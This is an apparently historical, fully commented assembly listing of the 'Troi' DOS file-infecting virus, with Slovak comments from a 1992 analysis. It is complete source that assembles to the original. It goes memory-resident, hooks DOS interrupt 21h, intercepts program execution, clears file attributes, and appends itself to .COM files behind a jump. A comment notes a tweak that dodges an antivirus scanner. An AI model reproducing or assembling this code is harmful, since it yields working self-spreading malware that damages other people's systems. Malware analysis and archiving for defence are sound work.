


;--------------------------------------------------------------------------
;
;                         The Troi Virus
;
;--------------------------------------------------------------------------
;
;
; analyza   Milan Mancel  15.3.1992
; povod	    USA (??) 1992 (??)
; vzorka    Snorre Fagerland
;
; Po prelozeni v TASM vznikne original
;--------------------------------------------------------------------------

troi   segment
       assume cs:troi, ds:troi


       org     100h
  
Start:

;*     jmp     Virus         ; Skok na zaciatok virusu
       db      0E9h, 02, 00

       int     21h           ; zvysok povodneho
                             ; programu

;--------------------------------------------------------------------------

Virus:
       call    Body          ; zistuje offset svojho
                             ; zaciatku
Body:  pop     bp            ;
       sub     bp,3          ;
       jmp     short lb_01   ; 

       nop                   ; Ked je tento nop pred pop bp
                             ; tak Scan nehlasi Best Wishes
                             ; 
       db      0B8h, 00h, 4Ch; Odlozene prve tri bajty
                             ; povodneho programu
       db      00h
       db      'The Troi Virus'

lb_01: cld
       mov     ah,0FCh       ; zistuje ci uz je
       int     21h           ; aktivny v pamati
       cmp     al,0A5h       ; (Tuto cast kontroluje Scan89)
       je      lb_02         ; ano

       sub     ax,ax         ; presunie sa do pamate
       mov     es,ax         ; na adresu 0000:0200
       mov     si,bp         ;
       mov     di,0200h      ;
       mov     cx,0142h      ; dlzka je 322 bajtov
       rep     movsb         ;

       push    es            ; odlozi povodny vektor
       pop     ds            ; int 21h na adresu
       mov     si,0084h      ; 0000:0342
       mov     bx,si         ;
       mov     di,0342h      ;
       nop                   ;
       movsw                 ;
       movsw                 ;

       cli                   ; nastavi int 21h na
       mov     word ptr [bx],25Ah
       mov     [bx+2],es     ; svoj handler
       sti                   ;

       push    cs
       pop     es
       push    cs
       pop     ds
lb_02:
       lea     si,[bp+0Ah]   ; Obnovi prve tri bajty
       mov     di,offset ds:[100h]
       push    di            ; povodneho programu
       movsw                 ; a odovzda mu riadenie
       movsb                 ;
       retn                  ;


       sub     al,al         ; ????
       iret                  ; ????


;------------------------------------------------------------------------
;
; Novy handler int 21h

new_int_21:
       pushf                            
       cmp     ah,0FCh        ; Zistuje sa pritomnost    
       jne     lb_03        ; virusu v pamati?    
       mov     al,0A5h        ; Ak ano vrat A5h    
       popf                                
       iret                                

lb_03: cmp     ah,04Bh        ; EXEC?    
       je      lb_04                         
       jmp     Koniec                         

lb_04: push    ax
       push    bx
       push    cx
       push    dx
       push    si
       push    di
       push    bp
       push    ds
       push    es

       cld
       mov     bp,sp
       push    dx
       pop     di
       push    ds
       pop     es

       mov     al,'.'        ; Najdi bodku v mene suboru
       mov     cx,40h        ;
       repne   scasb         ;

       mov     ax,[di]       ; pripona je '.CO' ?
       or      ax,2020h      ; (.COM)
       cmp     ax,6F63h      ;

       je      lb_05
       jmp     lb_10

lb_05: mov     ax,4300h      ; Vezmi atributy
       int     21h		;
       jnc     lb_07

lb_06: jmp     lb_10

lb_07: push    cx
       push    ds
       push    dx

       and     cl,0F9h       ; Vymaskuj Hidden/System
       mov     ax,4301h      ; bity atributov a zapis
       int     21h           ;

       mov     ax,3D02h      ; Otvor subor pre R/W
       int     21h		;

       jc      lb_06
       mov     bx,ax         ; Odloz file deskriptor

       push    cs
       pop     ds
       mov     ax,5700h      ; Vezmi cas/datum suboru
       int     21h		;

       jc      lb_09
       push    dx
       push    cx

       mov     ah,3Fh        ; nacitaj prve 3 bajty
       mov     cx,3          ; a odloz
       mov     dx,offset ds:[20Ah]
       int     21h           ;

       jc      lb_08         ; posun sa na predposlednu
       mov     ax,4202h      ; poziciu v subore
       sub     cx,cx         ;
       not     cx            ;
       mov     dx,0FFFEh     ;
       int     21h           ;

       jc      lb_08
       sub     ax,1          ; vypocet offsetu pre
       mov     ds:034bh,ax   ; skok na virus - ulozi
                             ; sa do prvych bajtov
                             ; suboru

       mov     ah,3Fh        ; Zisti, ci posledne dva
       mov     cx,2          ; bajty suboru su DBBDh
       mov     dx,034dh      ;
       nop                   ;
       int     21h           ;
       jc      lb_08         ;
       mov     ax,ds:034dh   ;
       cmp     ax,0DBBDh     ;
       je      lb_08         ;

       mov     ax,4200h      ; nastav sa na zaciatok
       sub     cx,cx         ; suboru
       sub     dx,dx         ;
       int     21h           ;

       mov     ax,40E9h      ; zapis skok na virus
       mov     ds:034ah,al   ; al=E9 je prvy bajt
       mov     cx,3          ;
       mov     dx,034Ah      ;
       nop                   ;
       int     21h           ;
       jc      lb_08

       mov     ax,4202h      ; nastav sa na koniec
       sub     cx,cx         ; suboru
       sub     dx,dx         ;
       int     21h           ;

       mov     ah,40h        ; pripoj virus ku koncu
       mov     cx,142h       ; suboru (322 bajtov)
       nop                   ;
       mov     dx,offset ds:[200h]
       int     21h           ;

lb_08:
       int     3             ; ?? oklamanie nepriatela ??
       pop     dx		

       mov     ax,5701h      ; nastav cas/datum suboru
       int     21h           ;

lb_09: mov     ah,3Eh        ; Zavri subor
       int     21h           ;

       pop     dx
       pop     ds
       pop     cx
       mov     ax,4301h      ; vrat atributy do 
       int     21h           ; povodneho stavu

lb_10: mov     sp,bp
       pop     es
       pop     ds
       pop     bp
       pop     di
       pop     si
       pop     dx
       pop     cx
       pop     bx
       pop     ax

Koniec:
       popf                  ; skoc na povodny
       jmp     dword ptr cs:[0342h]
                             ; handler int 21h

       db      0BDh,0DBh     ; Priznak Troi v subore
 
;-------------------------------------------------------------------------- 

troi   ends
       end     start
;
;
;--------------------------------------------------------------------------

